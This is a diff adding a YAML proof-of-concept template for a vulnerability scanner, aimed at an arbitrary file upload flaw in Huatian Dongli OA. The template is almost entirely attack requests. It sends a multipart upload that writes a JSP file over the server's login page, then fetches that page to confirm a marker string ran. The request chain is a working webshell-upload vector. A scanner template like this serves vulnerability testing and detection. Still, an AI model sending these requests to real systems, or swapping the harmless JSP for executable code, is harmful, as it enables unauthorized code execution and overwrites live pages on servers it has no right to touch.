@@ -1,0 +1,42 @@
+name: huatiandongli-OA-Anyfileupload
+rules:
+  r0:
+    request:
+      method: POST
+      path: /OAapp/jsp/upload.jsp
+      body: |
+        ------WebKitFormBoundary5Ur8laykKAWws2QO
+        Content-Disposition: form-data; name="file"; filename="xxx.xml"
+        Content-Type: image/png
+        
+        real path
+        ------WebKitFormBoundary5Ur8laykKAWws2QO
+        Content-Disposition: form-data; name="filename"
+        
+        xxx.png
+        ------WebKitFormBoundary5Ur8laykKAWws2QO--
+    expression: response.status == 200 && response.headers["content-type"].icontains("text/html")
+  r1:
+    request:
+      method: POST
+      path: /OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp
+      body: |
+        ------WebKitFormBoundaryzRSYXfFlXqk6btQm
+        Content-Disposition: form-data; name="EDITFILE"; filename="xxx.txt"
+        Content-Type: image/png
+        
+        <%out.print("5DBB70");%>
+        ------WebKitFormBoundaryzRSYXfFlXqk6btQm
+        Content-Disposition: form-data; name="newFileName"
+        
+        D:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp
+        ------WebKitFormBoundaryzRSYXfFlXqk6btQm--
+    expression: response.status == 200 && response.headers["content-type"].icontains("text/html")
+  r2:
+    request:
+      method: GET
+      path: /OAapp/htpages/app/module/login/normalLoginPageForOther.jsp
+      headers:
+        Cookie: JSESSIONID=63A1AF6B0B60634BF5B8E71AB4D88B85
+    expression: response.status == 200 && response.headers["content-type"].icontains("text/html") && response.body.bcontains(b'5DBB70')
+expression: r0() && r1() && r2()
